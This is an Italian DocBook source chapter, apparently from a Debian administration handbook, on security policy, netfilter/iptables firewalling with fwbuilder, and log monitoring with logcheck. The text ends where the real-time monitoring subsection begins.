<?xml version='1.0' encoding='utf-8' ?>
<!DOCTYPE chapter PUBLIC "-//OASIS//DTD DocBook XML V4.5//EN" "http://www.oasis-open.org/docbook/xml/4.5/docbookx.dtd" [
]>
<chapter id="security" lang="it-IT">
	<chapterinfo>
		 <keywordset>
			<keyword>Firewall</keyword>
			 <keyword>Netfilter</keyword>
			 <keyword>IDS/NIDS</keyword>

		</keywordset>

	</chapterinfo>
	 <title>Sicurezza</title>
	 <highlights> <para>
		Un sistema informatico può presentare un livello di importanza variabile a seconda dell'ambiente. In alcuni casi è vitale per la sopravvivenza dell'azienda. Perciò deve essere protetto da vari tipi di rischi. Il processo di valutazione di questi rischi, la loro definizione e l'implementazione della protezione sono comunemente conosciuti come «processo di sicurezza».
	</para>
	 </highlights> <section id="sect.defining-security-policy">
		<title>Definire la politica di sicurezza</title>
		 <sidebar> <title><emphasis>ATTENZIONE</emphasis> Scopo di questo capitolo</title>
		 <para>
			La sicurezza è un argomento vasto e molto delicato, perciò non pretendiamo di descriverlo in modo esauriente nel corso di un singolo capitolo. Verranno solo delineati alcuni punti fondamentali e descritti alcuni degli strumenti e metodi che possono essere utili nell'ambito della sicurezza. Per maggiori approfondimenti, la letteratura abbonda, e all'argomento vengono dedicati interi libri. Un eccellente punto di partenza può essere <citetitle>Linux Server Security</citetitle> di Michael D. Bauer (pubblicato da O'Reilly).
		</para>
		 </sidebar> <para>
			La parola «sicurezza» di per sé coinvolge un ampio inseme di concetti, strumenti e procedure, nessuno dei quali ha valenza universale. Per scegliere tra questi bisogna farsi un'idea precisa di quali siano i propri obbiettivi. La messa in sicurezza di un sistema inizia con la ricerca della risposta ad alcune domande. Buttandosi a capofitto nell'implementazione di un insieme arbitrario di strumenti, si rischia di concentrarsi su aspetti errati della sicurezza.
		</para>
		 <para>
			La primissima cosa da definire è perciò lo scopo. Un buon approccio che ne facilita l'individuazione inizia con le seguenti domande:
		</para>
		 <itemizedlist>
			<listitem>
				<para>
					<emphasis>Cosa</emphasis> stiamo tentando di proteggere? La politica di sicurezza sarà differente se vogliamo proteggere il computer oppure i dati. Nell'ultimo caso, abbiamo anche bisogno di conoscere quali dati.
				</para>

			</listitem>
			 <listitem>
				<para>
					Da <emphasis>cosa</emphasis> stiamo tentando di proteggerci? Fuga di dati confidenziali? Perdita accidentale di dati? Mancati ricavi derivanti da interruzione di servizio?
				</para>

			</listitem>
			 <listitem>
				<para>
					Inoltre, <emphasis>da chi</emphasis> stiamo tentando di proteggerci? Le misure di sicurezza possono essere piuttosto differenti se si deve rimediare all'errore di un utente ordinario rispetto alla difesa da un gruppo di autori di attacchi determinati.
				</para>

			</listitem>

		</itemizedlist>
		 <para>
			Il termine «rischio» è utilizzato abitualmente per riferirsi all'insieme di questi tre fattori: cosa proteggere, cosa si vuole evitare che accada, e chi vuole che accada. L'individuazione del rischio richiede la risposta a queste tre domande. Da questo modello di rischio può essere costruita una politica di sicurezza, che può essere implementata con azioni concrete.
		</para>
		 <sidebar> <title><emphasis>NOTA</emphasis> Farsi continuamente domande</title>
		 <para>
			Bruce Schneier, esperto mondiale in materia di sicurezza (non solo di sicurezza informatica) cerca di contrastare uno dei miti principali della sicurezza con un motto: «La sicurezza è un processo, non un prodotto». Il patrimonio da proteggere varia nel tempo, e di pari passo variano anche le minacce e i mezzi a disposizione dei potenziali autori di un attacco. Sebbene la politica di sicurezza inizialmente sia stata progettata e implementata allo stato dell'arte, non bisogna mai dormire sugli allori. Le componenti del rischio evolvono, e di conseguenza deve evolvere la risposta a questo rischio.
		</para>
		 </sidebar> <para>
			Vale la pena di prendere in considerazione anche vincoli aggiuntivi, in quanto possono restringere la gamma delle politiche da intraprendere. Quanto siamo disposti a fare per proteggere il sistema? Questa domanda ha un forte impatto sulle scelte da adottare. La risposta è troppo spesso definita unicamente in base ad aspetti economici, ma bisogna considerare anche altri elementi, come la quantità di disagio imposto agli utenti del sistema o l'impatto negativo sulle prestazioni.
		</para>
		 <para>
			Una volta creato un modello del rischio, bisogna iniziare a pensare alla progettazione di una concreta politica di sicurezza.
		</para>
		 <sidebar> <title><emphasis>NOTA</emphasis> Politiche estreme</title>
		 <para>
			Ci sono casi in cui la scelta delle azioni richieste per mettere in sicurezza un sistema è estremamente semplice.
		</para>
		 <para>
			Per esempio, se il sistema da proteggere comprende solamente un computer di seconda mano, il cui unico utilizzo è quello di fare un po' di calcoli al termine della giornata, potrebbe essere piuttosto ragionevole decidere di non fare nulla di particolare per proteggerlo. Il valore intrinseco del sistema è basso. Il valore dei dati è zero poiché non sono immagazzinati nella macchina. Un potenziale autore di un attacco che si infiltrasse nel «sistema» guadagnerebbe solo un'ingombrante calcolatrice. Il costo della messa in sicurezza di tale sistema sarebbe probabilmente maggiore del costo della violazione.
		</para>
		 <para>
			All'altro estremo, potremmo voler proteggere la confidenzialità di dati segreti nel modo più completo possibile, sopra ogni altra considerazione. In questo caso, una risposta appropriata potrebbe essere la distruzione totale di quei dati (eliminando i file in modo sicuro, distruggendo in pezzi il disco fisso, sciogliendoli poi in acido e così via). Se invece c'è il requisito aggiuntivo di mantenere i dati archiviati per un uso futuro (anche se non necessariamente a portata di mano) e se il costo non è ancora un fattore importante, allora un punto di partenza potrebbe essere memorizzare i dati su piastre di lega platino-iridio stoccate in bunker a prova di bomba sotto varie montagne sparse nel mondo, ognuno dei quali (ovviamente) totalmente segreti e sorvegliati da interi eserciti…
		</para>
		 <para>
			Anche se questi esempi possono sembrare estremi, sarebbero comunque una risposta adeguata ai rischi definiti, in quanto sono il risultato di un ragionamento che tiene conto degli obiettivi da raggiungere e dei vincoli da soddisfare. Nessuna politica di sicurezza, quando deriva da una decisione ragionata, è meno rispettabile di ogni altra.
		</para>
		 </sidebar> <para>
			Nella maggior parte dei casi, il sistema informatico può essere segmentato in sottoinsiemi coerenti e per lo più indipendenti. Ogni sottosistema avrà i propri requisiti e vincoli, e quindi la valutazione del rischio e la progettazione della politica di sicurezza dev'essere effettuata separatamente per ognuno. Un buon principio da seguire è che un perimetro breve e ben definito è più facile da difendere di una frontiera lunga e tortuosa. L'architettura di rete dev'essere progettata di conseguenza: i servizi critici devono essere concentrati in poche macchine, e tali macchine devono essere accessibili attraverso un numero minimo di punti di controllo; sarà più facile proteggere questi punti piuttosto di schermare tutte le macchine sensibili dall'intero mondo esterno. È a questo punto che diventa evidente l'utilità di regolamentare il traffico di rete (anche attraverso firewall). Questo processo può essere implementato con hardware dedicato, ma una possibile soluzione più semplice e flessibile è l'uso di un firewall software come quello integrato nel kernel Linux.
		</para>

	</section>
	 <section id="sect.firewall-packet-filtering">
		<title>Firewall o filtraggio dei pacchetti</title>
		 <indexterm>
			<primary>firewall</primary>
		</indexterm>
		 <indexterm>
			<primary>filtraggio pacchetti</primary>
		</indexterm>
		 <sidebar> <title><emphasis>FONDAMENTALI</emphasis> Firewall</title>
		 <indexterm>
			<primary>pacchetto</primary>
			<secondary>IP</secondary>
		</indexterm>
		 <para>
			Il <emphasis>firewall</emphasis> è un componente informatico provvisto di hardware e/o software che smista i pacchetti di rete in ingresso o uscita (che arrivano o lasciano la rete locale) e li lascia passare solo se soddisfano determinati criteri predefiniti.
		</para>
		 </sidebar> <para>
			Il firewall è un punto di filtraggio di rete ed è efficace solo per i pacchetti che devono transitare da esso. Perciò può essere efficace solo se il passaggio attraverso il firewall è l'unico instradamento possibile per quei pacchetti.
		</para>
		 <para>
			La mancanza di una configurazione standard (e il motto «processo, non prodotto») spiega l'assenza di una soluzione chiavi in mano. Ci sono, comunque, strumenti che semplificano la configurazione del firewall <emphasis>netfilter</emphasis>, con una rappresentazione grafica delle regole di filtraggio. <command>fwbuilder</command> tra questi è senza dubbio uno dei migliori.
		</para>
		 <indexterm>
			<primary><emphasis>netfilter</emphasis></primary>
		</indexterm>
		 <sidebar> <title><emphasis>CASO SPECIFICO</emphasis> Firewall Locale</title>
		 <para>
			Un firewall può essere limitato ad una particolare macchina (a differenza di un'intera rete), nel qual caso la sua funzione è quella di filtrare o limitare l'accesso ad alcuni servizi, oppure di impedire connessioni uscenti a software malevolo che un utente, volente o nolente, potrebbe aver installato.
		</para>
		 </sidebar> <para>
			Il kernel Linux incorpora il firewall <emphasis>netfilter</emphasis>. Può essere controllato nello spazio utente con i comandi <command>iptables</command> e <command>ip6tables</command>. La differenza risiede nel fatto che il primo agisce sulle reti IPv4, il secondo su quelle IPv6. Poiché entrambi i protocolli di rete coesisteranno probabilmente per molti anni, entrambi dovranno essere utilizzati in parallelo.
		</para>
		 <indexterm>
			<primary><command>iptables</command></primary>
		</indexterm>
		 <indexterm>
			<primary><command>ip6tables</command></primary>
		</indexterm>
		 <section id="sect.netfilter">
			<title>Funzionamento di netfilter</title>
			 <para>
				<emphasis>netfilter</emphasis> utilizza quattro tabelle distinte nelle quali memorizza le regole che controllano tre tipologie di operazioni sui pacchetti:
			</para>
			 <itemizedlist>
				<listitem>
					<para>
						<literal>filter</literal> riguarda le regole di filtraggio (accettare, rifiutare o ignorare un pacchetto);
					</para>

				</listitem>
				 <listitem>
					<para>
						<literal>nat</literal> riguarda la traduzione di indirizzi e porte di origine o di destinazione dei pacchetti;
					</para>

				</listitem>
				 <listitem>
					<para>
						<literal>mangle</literal> riguarda altre trasformazioni sui pacchetti IP (inclusi il campo e le opzioni del ToS: <emphasis>Type of Service</emphasis>);
					</para>

				</listitem>
				 <listitem>
					<para>
						<literal>raw</literal> permette altre modifiche manuali sui pacchetti prima che giungano al sistema di monitoraggio delle connessioni.
					</para>

				</listitem>

			</itemizedlist>
			 <para>
				Ogni tabella contiene delle liste di regole chiamate <emphasis>catene</emphasis>. Per gestire i pacchetti i firewall utilizzano catene standard in base a circostanze predefinite. L'amministratore può creare altre catene, che saranno utilizzate solo quando una delle catene standard vi fa riferimento (direttamente o indirettamente).
			</para>
			 <indexterm>
				<primary>catena</primary>
			</indexterm>
			 <indexterm>
				<primary>regola di filtraggio</primary>
			</indexterm>
			 <para>
				La tabella <literal>filter</literal> contiene tre catene standard:
			</para>
			 <itemizedlist>
				<listitem>
					<para>
						<literal>INPUT</literal>: riguarda i pacchetti che hanno come destinazione il firewall stesso;
					</para>

				</listitem>
				 <listitem>
					<para>
						<literal>OUTPUT</literal>: riguarda i pacchetti emessi dal firewall;
					</para>

				</listitem>
				 <listitem>
					<para>
						<literal>FORWARD</literal>: riguarda i pacchetti che transitano attraverso il firewall (che non è né la sorgente, né la destinazione).
					</para>

				</listitem>

			</itemizedlist>
			 <para>
				Anche la tabella <literal>nat</literal> contiene tre catene standard:
			</para>
			 <itemizedlist>
				<listitem>
					<para>
						<literal>PREROUTING</literal>: per modificare i pacchetti non appena arrivano;
					</para>

				</listitem>
				 <listitem>
					<para>
						<literal>POSTROUTING</literal>: per modificare i pacchetti quando sono pronti per essere spediti;
					</para>

				</listitem>
				 <listitem>
					<para>
						<literal>OUTPUT</literal>: per modificare i pacchetti generati dal firewall stesso.
					</para>

				</listitem>

			</itemizedlist>
			 <figure id="figure.chaines-netfilter">
				<title>Relazione tra le catene <emphasis>netfilter</emphasis></title>
				 <mediaobject>
					<imageobject>
						<imagedata fileref="images/netfilter.png" format="PNG" scalefit="1" width="65%" />
					</imageobject>

				</mediaobject>

			</figure>
			 <para>
				Ogni catena è una lista di regole; ogni regola è un insieme di condizioni e un'azione da intraprendere quando le condizioni sono soddisfatte. Quando viene analizzato un pacchetto, il firewall esamina la catena opportuna, regola per regola; quando le condizioni di una regola sono soddisfatte, esso, per continuare l'elaborazione, «salta» (da qui l'opzione <literal>-j</literal> dei comandi) all'azione specificata. Sono stati standardizzati i comportamenti più comuni ed esistono azioni dedicate per ognuno. Intraprendere una di queste azioni standard interrompe l'avanzamento nella catena, dato che il destino del pacchetto è già stato deciso (salvo l'eccezione descritta in seguito):
			</para>
			 <sidebar> <title><emphasis>FONDAMENTALI</emphasis> ICMP</title>
			 <para>
				ICMP (<emphasis>Internet Control Message </emphasis>Protocol) è il protocollo usato per trasmettere informazioni supplementari sulle comunicazioni. Permette di provare la connettività di rete con il comando <command>ping</command> (che invia un messaggio ICMP di <emphasis>echo request</emphasis>, al quale il destinatario risponde con un messaggio ICMP di <emphasis>echo reply</emphasis>). Può rilevare un firewall che rifiuta un pacchetto, indicare l'overflow di un buffer di ricezione, proporre un instradamento migliore per i successivi pacchetti nella connessione e così via. Questo protocollo è definito in numerosi documenti RFC; le prime RFC777 e RFC792 sono state ben presto completate ed estese. <ulink type="block" url="http://www.faqs.org/rfcs/rfc777.html" /> <ulink type="block" url="http://www.faqs.org/rfcs/rfc792.html" />
			</para>
			 <para>
				Per chiarezza, un buffer di ricezione è una piccola area di memoria che immagazzina i dati nel tempo che intercorre tra il loro arrivo dalla rete e la loro elaborazione da parte del kernel. Se quest'area si riempie, non possono esser ricevuti nuovi dati, e l'ICMP segnala il problema, così la sorgente può abbassare la velocità di trasferimento (che raggiungerà idealmente un equilibrio dopo un certo tempo).
			</para>
			 <indexterm>
				<primary>ICMP</primary>
			</indexterm>
			 <indexterm>
				<primary>Internet Control Message Protocol</primary>
			</indexterm>
			 <indexterm>
				<primary>buffer di ricezione</primary>
			</indexterm>
			 <indexterm>
				<primary>buffer</primary>
				<secondary>buffer di ricezione</secondary>
			</indexterm>
			 <indexterm>
				<primary><command>ping</command></primary>
			</indexterm>
			 <para>
				Da notare che, anche se le reti IPv4 possono lavorare senza ICMP, ICMPv6 è strettamente necessario per le reti IPv6, dato che esse utilizzano molte funzioni che erano, per il mondo IPv4, fornite da ICMPv4, IGMP (<emphasis>Internet Group Membership Protocol</emphasis>) e ARP (<emphasis>Address Resolution Protocol</emphasis>). ICMPv6 è definito nella RFC4443. <ulink type="block" url="http://www.faqs.org/rfcs/rfc4443.html" />
			</para>
			 </sidebar> <para>
			</para>
			 <itemizedlist>
				<listitem>
					<para>
						<literal>ACCEPT</literal>: permette al pacchetto di continuare per la sua strada;
					</para>

				</listitem>
				 <listitem>
					<para>
						<literal>REJECT</literal>: rifiuta il pacchetto con un pacchetto di errore ICMP (l'opzione <literal>--reject-with <replaceable>tipo</replaceable></literal> di <command>iptables</command> permette di selezionare il tipo di errore);
					</para>

				</listitem>
				 <listitem>
					<para>
						<literal>DROP</literal>: elimina (ignora) il pacchetto;
					</para>

				</listitem>
				 <listitem>
					<para>
						<literal>LOG</literal>: registra (via <command>syslogd</command>) un messaggio con la descrizione del pacchetto; da notare che questa azione non interrompe l'elaborazione, e l'esecuzione della catena prosegue con la regola successiva, ed è per questo che per registrare i pacchetti rifiutati è necessario usare insieme una regola LOG e una REJECT o DROP;
					</para>

				</listitem>
				 <listitem>
					<para>
						<literal>ULOG</literal>: registra un messaggio via <command>ulogd</command>, che può essere maggiormente personalizzato ed è più efficiente di <command>syslogd</command> per analizzare una grande mole di messaggi; da notare che questa azione, come «LOG», anch'essa fa proseguire l'elaborazione con la regola successiva nella catena corrente;
					</para>

				</listitem>
				 <listitem>
					<para>
						<replaceable>nome_catena</replaceable>: salta alla catena specificata ed elabora le relative regole;
					</para>

				</listitem>
				 <listitem>
					<para>
						<literal>RETURN</literal>: interrompe l'elaborazione della catena corrente, e ritorna alla catena chiamante; nel caso in cui la catena corrente sia standard, non esiste alcuna catena chiamante, perciò viene eseguita l'azione predefinita (specificata dall'opzione <literal>-P</literal> di <command>iptables</command>);
					</para>

				</listitem>
				 <listitem>
					<para>
						<literal>SNAT</literal> (solo nella tabella <literal>nat</literal>): applica la <emphasis>Destinazione NAT</emphasis> (opzioni ulteriori descrivono l'esatta modifica da applicare);
					</para>

				</listitem>
				 <listitem>
					<para>
						<literal>DNAT</literal> (solo nella tabella <literal>nat</literal>): applica la <emphasis>Destinazione NAT</emphasis> (opzioni ulteriori descrivono l'esatta modifica da applicare);
					</para>

				</listitem>
				 <listitem>
					<para>
						<literal>MASQUERADE</literal> (solo nella tabella <literal>nat</literal>): applica il <emphasis>mascheramento</emphasis> (caso speciale di <emphasis>Sorgente NAT</emphasis>);
					</para>

				</listitem>
				 <listitem>
					<para>
						<literal>REDIRECT</literal> (solo nella tabella <literal>nat</literal>): reinstrada un pacchetto verso una data porta dello stesso firewall; può essere usato per creare un proxy trasparente alla rete che funziona senza necessità di configurazioni lato client, dato che il client pensa di connettersi al destinatario mentre le comunicazioni in realtà attraversano il proxy.
					</para>

				</listitem>

			</itemizedlist>
			 <para>
				Altre azioni, in particolare quelle riguardanti la tabella <literal>mangle</literal>, esulano dagli scopi di questo libro. Una lista integrale si ottiene con <citerefentry><refentrytitle>iptables</refentrytitle>
				 <manvolnum>8</manvolnum></citerefentry> e <citerefentry><refentrytitle>ip6tables</refentrytitle>
				 <manvolnum>8</manvolnum></citerefentry>.
			</para>

		</section>
		 <section id="sect.iptables">
			<title>Sintassi di <command>iptables</command> e <command>ip6tables</command></title>
			 <para>
				I comandi <command>iptables</command> e <command>ip6tables</command> permettono la manipolazione di tabelle, catene e regole. L'opzione <literal>-t <replaceable>tabella</replaceable></literal> individua su quale tabella vanno ad operare (<literal>filter</literal> è la predefinita).
			</para>
			 <indexterm>
				<primary><command>iptables</command></primary>
			</indexterm>
			 <indexterm>
				<primary><command>ip6tables</command></primary>
			</indexterm>
			 <section id="sect.iptables-command">
				<title>Comandi</title>
				 <para>
					L'opzione <literal>-N <replaceable>chain</replaceable></literal> crea una nuova catena. <literal>-X <replaceable>chain</replaceable></literal> cancella una catena vuota e non usata. <literal>-A <replaceable>chain</replaceable> <replaceable>regola</replaceable></literal> aggiunge una regola in coda ad una catena. <literal>-I <replaceable>chain</replaceable> <replaceable>numero_regola</replaceable> <replaceable>regola</replaceable></literal> inserisce una regola prima della regola numero <replaceable>numero_regola</replaceable>. <literal>-D <replaceable>chain</replaceable> <replaceable>numero_regola</replaceable></literal> (oppure <literal>-D <replaceable>chain</replaceable> <replaceable>regola</replaceable></literal>) cancella una regola in una catena; la prima sintassi identifica la regola da rimuovere in base al suo numero, mentre la seconda la identifica in base al suo contenuto. L'opzione <literal>-F <replaceable>chain</replaceable></literal> svuota una catena (rimuove tutte le sue regole); se non è specificata alcuna catena, vengono rimosse tutte le regole dalla tabella. <literal>-L <replaceable>catena</replaceable></literal> elenca le regole nella catena. Infine, l'opzione <literal>-P <replaceable>chain</replaceable> <replaceable>azione</replaceable></literal> definisce l'azione predefinita, o "linea guida", per una data catena; da notare che solo le catene standard possono avere una "linea guida".
				</para>

			</section>
			 <section id="sect.iptables-rules">
				<title>Regole</title>
				 <indexterm>
					<primary>regola di filtraggio</primary>
				</indexterm>
				 <para>
					Ogni regola si esprime con <literal><replaceable>condizioni</replaceable> -j <replaceable>azione</replaceable> <replaceable>opzioni_azione</replaceable></literal>. Se viene definita più di una condizione nella stessa regola, allora il criterio è la congiunzione (<emphasis>and</emphasis> logico) delle condizioni, che è restrittivo tanto quanto ognuna delle singole condizioni.
				</para>
				 <para>
					La condizione <literal>-p <replaceable>protocollo</replaceable></literal> verifica il campo protocollo del pacchetto IP. I valori più usati sono <literal>tcp</literal>, <literal>udp</literal>, <literal>icmp</literal> e <literal>icmpv6</literal>. Anteporre un punto esclamativo alla condizione la nega, facendola corrispondere a «qualunque pacchetto con un protocollo differente da quello specificato». Questa meccanismo di negazione non è specifico solo per l'opzione <literal>-p</literal>, ma può essere utilizzato anche per tutte le altre condizioni.
				</para>
				 <para>
					La condizione <literal>-s <replaceable>indirizzo</replaceable></literal> oppure <literal>-s <replaceable>rete/maschera</replaceable></literal> verifica l'indirizzo sorgente del pacchetto. Ugualmente, <literal>-d <replaceable>indirizzo</replaceable></literal> oppure <literal>-d <replaceable>rete/maschera</replaceable></literal> verifica l'indirizzo destinazione.
				</para>
				 <para>
					La condizione <literal>-i <replaceable>interfaccia</replaceable></literal> seleziona i pacchetti provenienti dalla data interfaccia di rete. <literal>-o <replaceable>interfaccia</replaceable></literal> seleziona quelli uscenti da una specifica interfaccia.
				</para>
				 <para>
					Ci sono condizioni più specifiche, che dipendono da quelle generiche descritte sopra. Per esempio, la condizione <literal>-p tcp</literal> può essere raffinata con ulteriori condizioni sulle porte TCP, con clausole tipo <literal>--source-port <replaceable>porta</replaceable></literal> e <literal>--destination-port <replaceable>porta</replaceable></literal>.
				</para>
				 <para>
					La condizione <literal>--state <replaceable>stato</replaceable></literal> verifica lo stato di un pacchetto in una connessione (questa richiede il modulo del kernel <command>ipt_conntrack</command>, per il monitoraggio delle connessioni). Lo stato <literal>NEW</literal> descrive un pacchetto che instaura una nuova connessione; <literal>ESTABLISHED</literal> descrive i pacchetti appartenenti ad una connessione già in essere, e <literal>RELATED</literal> descrive i pacchetti che instaurano una connessione correlata con una già esistente (che è utile per le connessioni <literal>ftp-data</literal> in modalità «attiva» del protocollo FTP).
				</para>
				 <para>
					La sezione precedente elenca tutte le possibili azioni, ma non le rispettive opzioni. L'azione <literal>LOG</literal>, per esempio, ha le seguenti opzioni:
				</para>
				 <itemizedlist>
					<listitem>
						<para>
							<literal>--log-level</literal>, con valore predefinito <literal>warning</literal>, indica il livello di gravità di <command>syslog</command>;
						</para>

					</listitem>
					 <listitem>
						<para>
							<literal>--log-prefix</literal> permette l'inserimento di un prefisso di testo per differenziare i messaggi di log;
						</para>

					</listitem>
					 <listitem>
						<para>
							<literal>--log-tcp-sequence</literal>, <literal>--log-tcp-options</literal> e <literal>--log-ip-options</literal> indicano dati ulteriori da integrare nel messaggio: rispettivamente, il numero di sequenza TCP, opzioni TCP e opzioni IP.
						</para>

					</listitem>

				</itemizedlist>
				 <para>
					L'azione <literal>DNAT</literal> prevede l'opzione <literal>--to-destination <replaceable>indirizzo</replaceable>:<replaceable>porta</replaceable></literal> per indicare il nuovo indirizzo IP e/o porta di destinazione. Allo stesso modo, <literal>SNAT</literal> prevede <literal>--to-source <replaceable>indirizzo</replaceable>:<replaceable>porta</replaceable></literal> per indicare il nuovo indirizzo IP e/o porta di origine.
				</para>
				 <para>
					L'azione <literal>REDIRECT</literal> (disponibile solo per IPv4) prevede l'opzione <literal>--to-ports <replaceable>porta(e)</replaceable></literal> per indicare la porta, o l'intervallo di porte, dove vengono reindirzzati i pacchetti.
				</para>

			</section>

		</section>
		 <section id="sect.creating-rules">
			<title>Creare le regole</title>
			 <para>
				Per la creazione di ogni regola è necessaria l'invocazione di <command>iptables</command>/<command>ip6tables</command>. Digitare questi comandi manualmente può essere noioso, perciò sono solitamente memorizzati in uno script in modo tale che ad ogni avvio della macchina venga richiamata automaticamente la stessa configurazione. Questo script può essere scritto a mano, ma può essere interessante prepararlo con uno strumento di alto livello quale <command>fwbuilder</command>.
			</para>
			 
<screen>
<computeroutput># </computeroutput><userinput>apt install fwbuilder</userinput></screen>
			 <para>
				Il principio è semplice. Come primo passo, è necessario descrivere tutti gli elementi coinvolti nelle regole effettive:
			</para>
			 <itemizedlist>
				<listitem>
					<para>
						il firewall stesso, con le sue interfacce di rete;
					</para>

				</listitem>
				 <listitem>
					<para>
						le reti, con i loro corrispondenti intervalli di IP;
					</para>

				</listitem>
				 <listitem>
					<para>
						i server;
					</para>

				</listitem>
				 <listitem>
					<para>
						le porte che appartengono ai servizi presenti nei server.
					</para>

				</listitem>

			</itemizedlist>
			 <para>
				Le regole sono quindi create con semplici azioni di trascina e rilascia sugli oggetti. Alcuni menu contestuali permettono di modificare le condizioni (la negazione, per esempio). Dopodiché deve essere scelta e configurata l'azione.
			</para>
			 <para>
				Per quanto concerne l'IPv6, si possono creare due diversi insiemi di regole per IPv4 e IPv6, oppure crearno uno e lasciare che <command>fwbuilder</command> traduca le regole in base con gli indirizzi assegnati agli oggetti.
			</para>
			 <figure id="figure.fwbuilder">
				<title>Finestra principale di fwbuilder</title>
				 <mediaobject>
					<imageobject>
						<imagedata fileref="images/fwbuilder.png" format="PNG" scalefit="1" />
					</imageobject>

				</mediaobject>

			</figure>
			 <indexterm>
				<primary><command>fwbuilder</command></primary>
			</indexterm>
			 <para>
				<command>fwbuilder</command> può generare uno script che configura il firewall in base alle regole che sono state definite. La sua architettura modulare gli conferisce l'abilità di generare script utilizzabili su sistemi differenti (<command>iptables</command> per Linux, <command>ipf</command> per FreeBSD e <command>pf</command> per OpenBSD).
			</para>

		</section>
		 <section id="sect.install-rules-at-boot">
			<title>Installare le regole ad ogni avvio</title>
			 <para>
				Negli altri casi, si consiglia di posizionare lo script di configurazione in una direttiva <literal>up</literal> del file <filename>/etc/network/interfaces</filename>. Nel seguente esempio, lo script è memorizzato in <filename>/usr/local/etc/arrakis.fw</filename>.
			</para>
			 <example id="example.network-interfaces-firewall">
				<title>File <filename>interfaces</filename> che richiama lo script del firewall</title>
				 
<programlisting>auto eth0
iface eth0 inet static
    address 192.168.0.1
    network 192.168.0.0
    netmask 255.255.255.0
    broadcast 192.168.0.255
    up /usr/local/etc/arrakis.fw</programlisting>

			</example>
			 <para>
				Questo presuppone ovviamente che si stia usando <emphasis role="pkg">ifupdown</emphasis> per configurare le interfacce di rete. Se si sta utilizzando qualcos'altro (come <emphasis>NetworkManager</emphasis> o <emphasis>systemd-networkd</emphasis>), bisogna invece fare riferimento alla loro documentazione per trovare il modo di eseguire lo script dopo che l'interfaccia di rete è stata abilitata.
			</para>

		</section>

	</section>
	 <section id="sect.supervision">
		<title>Supervisione: prevenire, rilevare, dissuadere</title>
		 <indexterm>
			<primary>monitoraggio</primary>
		</indexterm>
		 <para>
			Il monitoraggio è parte integrante di ogni politica di sicurezza per svariati motivi. Tra questi, il fatto che l'obiettivo della sicurezza non è solitamente limitato soltanto alla garanzia della riservatezza dei dati, ma include anche l'assicurazione alla disponibilità dei servizi. È quindi obbligatorio verificare che tutto funzioni come previsto, e rilevare in maniera tempestiva ogni comportamento anomalo o variazione nella qualità dei(l) servizi(o) erogati(o). L'attività di monitoraggio permette di evidenziare tentativi di intrusione e permette di reagire rapidamente prima che si possa arrivare a gravi conseguenze. Questa sezione passa in rassegna alcuni strumenti che possono essere usati per monitorare molti degli aspetti di un sistema Debian. Come tale, completa <xref linkend="sect.monitoring" />.
		</para>
		 <section id="sect.logcheck">
			<title>Monitorare i log con <command>logcheck</command></title>
			 <indexterm>
				<primary><command>logcheck</command></primary>
			</indexterm>
			 <indexterm>
				<primary>log</primary>
				<secondary>monitoraggio</secondary>
			</indexterm>
			 <indexterm>
				<primary>monitoraggio</primary>
				<secondary>file di log</secondary>
			</indexterm>
			 <para>
				Il comando <command>logcheck</command> monitora i file di log ogni ora per impostazione predefinita. Invia messaggi di log inconsueti via email all'amministratore per analisi più approfondite.
			</para>
			 <para>
				La lista dei file monitorati è salvata in <filename>/etc/logcheck/logcheck.logfiles</filename>; i valori predefiniti funzionano bene se il file <filename>/etc/rsyslog.conf</filename> non è stato completamente stravolto.
			</para>
			 <para>
				<command>logcheck</command> lavora in uno di tre modi più o meno dettagliati: <emphasis>paranoid</emphasis>, <emphasis>server</emphasis> e <emphasis>workstation</emphasis>. Il primo è <emphasis>molto</emphasis> prolisso, e dovrebbe essere usato solo per server specifici come i firewall. Il secondo modo (predefinito) è consigliato per la maggior parte dei server. L'ultimo è progettato per le workstation, ed è ancora più conciso (filtra maggiormente i messaggi).
			</para>
			 <para>
				In tutti e tre i casi, <command>logcheck</command> probabilmente dovrà essere personalizzato escludendo alcuni messaggi extra (a seconda dei servizi installati), a meno che l'amministratore non voglia veramente ricevere ammassi orari di lunghe e noiose email. Poiché il meccanismo di selezione dei messaggi è piuttosto complesso, il file <filename>/usr/share/doc/logcheck-database/README.logcheck-database.gz</filename> è una lettura consigliata, anche se impegnativa.
			</para>
			 <para>
				Le regole applicate possono essere suddivise in varie tipologie:
			</para>
			 <itemizedlist>
				<listitem>
					<para>
						quelle che qualificano il messaggio come un tentativo di intrusione (memorizzato in un file nella directory <filename>/etc/logcheck/cracking.d/</filename>);
					</para>

				</listitem>
				 <listitem>
					<para>
						quelle che cancellano tale qualifica (<filename>/etc/logcheck/cracking.ignore.d/</filename>);
					</para>

				</listitem>
				 <listitem>
					<para>
						quelle che classificano il messaggio come un allarme di sicurezza (<filename>/etc/logcheck/violations.d/</filename>);
					</para>

				</listitem>
				 <listitem>
					<para>
						quelle che cancellano questa classificazione (<filename>/etc/logcheck/violations.ignore.d/</filename>);
					</para>

				</listitem>
				 <listitem>
					<para>
						infine, quelle che si applicano ai rimanenti messaggi (considerati come <emphasis>eventi di sistema</emphasis>).
					</para>

				</listitem>

			</itemizedlist>
			 <sidebar> <title><emphasis>ATTENZIONE</emphasis> Ignorare un messaggio</title>
			 <para>
				Tutti i messaggi etichettati come tentativo di intrusione oppure come allarme di sicurezza (seguendo una regola memorizzata in un file <filename>/etc/logcheck/violations.d/miofile</filename>) possono essere ignorati solamente tramite una regola nei file <filename>/etc/logcheck/violations.ignore.d/miofile</filename> oppure <filename>/etc/logcheck/violations.ignore.d/miofile-<replaceable>estensione</replaceable></filename>.
			</para>
			 </sidebar> <para>
				Un evento di sistema è sempre segnalato a meno che una regola in una directory <filename>/etc/logcheck/ignore.d.{paranoid,server,workstation}/</filename> stabilisca che l'evento debba essere ignorato. Le sole directory prese in considerazione sono esclusivamente quelle corrispondenti ad un livello di prolissità maggiore o uguale alla modalità di funzionamento selezionata.
			</para>

		</section>
		 <section id="sect.monitoring-activity">
			<title>Attività di monitoraggio</title>
			 <indexterm>
				<primary>monitoraggio</primary>
				<secondary>attività</secondary>
			</indexterm>
			 <indexterm>
				<primary>attività, monitoraggio</primary>
			</indexterm>
			 <section id="sect.real-time-monitoring">
				<title>In tempo reale</title>
				 <para>
